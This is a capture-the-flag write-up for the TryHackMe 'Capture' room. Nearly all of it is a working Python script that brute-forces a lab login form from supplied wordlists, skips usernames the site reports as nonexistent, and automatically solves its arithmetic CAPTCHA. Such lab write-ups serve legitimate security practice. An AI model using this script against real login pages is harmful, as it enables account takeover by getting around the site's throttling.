# Capture - [TryHackMe](https://tryhackme.com/room/capture) Writeup 
The task involves brute-forcing the login form and entering the correct CAPTCHA.

## 1. Download the zip file provided by the task.
We get two text files in the folder: usernames.txt and passwords.txt. Download the zip file provided for the task.

## 2. Scripts
This script was used for brute-forcing logins and solving captchas.

```python
import re
import requests
from tqdm import tqdm

URL = "http://10.10.10.10/login"
USERNAMES_FILE = "usernames.txt"
PASSWORDS_FILE = "passwords.txt"
SUCCESS_TEXT = "Welcome" 

HEADERS = {
    "User-Agent": "Mozilla/5.0",
    "Content-Type": "application/x-www-form-urlencoded"
}

session = requests.Session()

def calculate(num1, num2, operation):
    if operation == '+': return num1 + num2
    if operation == '-': return num1 - num2
    if operation == '*': return num1 * num2
    if operation == '/': return num1 / num2
    raise ValueError(f"Unknown operation: {operation}")

def extract_captcha(text):
    match = re.search(r"(\d+)\s*([\+\-\*/])\s*(\d+)", text)
    if match:
        num1, op, num2 = int(match[1]), match[2], int(match[3])
        return str(int(calculate(num1, num2, op)))
    return None

def user_does_not_exist(response_text):
    return "does not exist" in response_text.lower()

def attempt_login(username, password):
    data = {"username": username, "password": password}
    try:
        response = session.post(URL, headers=HEADERS, data=data, timeout=5)
        text = response.text.lower()

        if user_does_not_exist(text):
            return "skip", None

        if "captcha" in text:
            captcha = extract_captcha(text)
            if captcha:
                data["captcha"] = captcha
                response = session.post(URL, headers=HEADERS, data=data, timeout=5)
                text = response.text.lower()

        if SUCCESS_TEXT.lower() in text:
            return "success", response.text
        else:
            return "fail", None
    except Exception as e:
        return "error", str(e)

def main():
    with open(USERNAMES_FILE) as uf, open(PASSWORDS_FILE) as pf:
        usernames = uf.read().splitlines()
        passwords = pf.read().splitlines()

    for username in tqdm(usernames, desc="Usernames"):
        for password in passwords:
            status, result = attempt_login(username, password)
            if status == "skip":
                tqdm.write(f"[!] Skipping {username} — user doesn't exist")
                break
            elif status == "success":
                tqdm.write(f"[+] SUCCESS! {username}:{password}")
                with open("found.txt", "w") as f:
                    f.write(f"{username}:{password}\n")
                return
            elif status == "fail":
                tqdm.write(f"[-] Failed: {username}:{password}")
            elif status == "error":
                tqdm.write(f"[ERROR] {result}")
    
    tqdm.write("[-] Bruteforce finished. No valid credentials found.")

if __name__ == "__main__":
    main()
```
Yes, we managed to obtain a login and password.

## Conclusions 

An interesting room for practising brute-forcing and light scripting.
